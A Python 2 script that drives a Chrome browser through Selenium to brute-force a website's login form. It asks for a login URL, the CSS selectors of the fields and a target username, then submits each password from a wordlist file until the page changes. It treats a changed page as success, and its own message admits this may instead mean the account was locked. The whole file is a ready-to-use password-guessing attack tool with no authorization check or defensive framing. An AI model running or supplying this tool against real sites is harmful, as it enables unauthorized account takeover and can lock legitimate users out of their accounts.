import selenium
import requests
import time
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
import sys

#method-helper to print some messege in  colour
def print_colored_msg(msg, color):
    print color + msg + '\33[37m'

#method-helper to print some input in  colour and return user input
def input_colored_msg(msg, color):
    return raw_input(color + msg + '\33[37m')


#mathhod to dialog withh user: ask user to input parameters
def user_dialog():
    #ask user to input urls
    url = input_colored_msg('Enter url with login page: ', '\033[92m')
    print_colored_msg('Checking if site exists ', '\033[92m')
    #check if site url is valid
    check_website_exists(url)
    #ask user to input username css selector
    username_xpath = input_colored_msg('Enter the username hrmlselector: ', '\033[92m')
    #ask user to input password css selector
    pass_xpath = input_colored_msg('Enter the pass html selector: ', '\033[92m')
    #ask user to input login css selector
    login_xpath = input_colored_msg('Enter the Login button selector: ', '\033[92m')
    #ask user to input username
    username = input_colored_msg('Enter the username ', '\033[92m')
    #start brute force with given parameters
    brute_force(username, username_xpath, pass_xpath, login_xpath, url)


#method to chheck if url is a valid active website
def check_website_exists(website):
    #send request
    response = requests.get(website.replace(' ', ''))
    #if response code is 2xx - site exists
    if str(response.status_code)[0] == '2':
        print 'website exists'
    #exit script if sie not exists
    else:
        print print_colored_msg(' Website could not be located make sure to use http / https', '\033[91m')
        exit()


#method to brute force pass
def brute_force(username, username_xpath, password_xpath, login_xpath, url):
    #open file with passwords
    passfile = open('passlist.txt', 'r')
    #create sellenium  browser
    browser = create_webdriver()
    #start endless loop
    while True:
        try:
            #for every password forn file
            for line in passfile:
                #open url in browser
                browser.get(url)
                #delay
                time.sleep(0.5)
                #type username
                browser.find_element_by_css_selector(username_xpath).send_keys(username)
                #type password
                browser.find_element_by_css_selector(password_xpath).send_keys(line)
                #click LOGIN button
                browser.find_element_by_css_selector(login_xpath).click()
                #print info
                print (print_colored_msg('Tried password: ' + line + 'for user: ' + username, '\033[91m'))
        #exception if user interrcut by the key
        except KeyboardInterrupt:
            #close file
            passfile.close()
            #clsoe driver
            browser.close()
            exit()
        #if the password is correct, New page opened, so  old selectors is not  relevant. So, NoSuchElementException throwed
        except selenium.common.exceptions.NoSuchElementException:
            #congrats thhat password is correct
            print 'Password found or you have been locked'
            print print_colored_msg('Password has been found: {0}'.format(line), '\033[91m')
            #close file
            passfile.close()
            #close driver
            browser.close()
            exit()


#method to create and initializate selenium browser
def create_webdriver():
    #create options object
    optionss = webdriver.ChromeOptions()
    #block all popup windows
    optionss.add_argument("--disable-popup-blocking")
    #block all browser extensions
    optionss.add_argument("--disable-extensions")
    #create Selenium browser with options
    browser = webdriver.Chrome(chrome_options=optionss)
    return browser


if __name__ == "__main__":
    #check if any parameter passed
    if len(sys.argv) > 1:
        #check if '-h' in first parameter ('-h' or '--help')
        if '-h' in sys.argv[1]:
            #print usage info
            print("usage: please, run script with no parameters\n"
                  "Copy CSS selector from browser code behind when required\nEnjoy results:)")

    else:
        #start dialog  with user
        user_dialog()
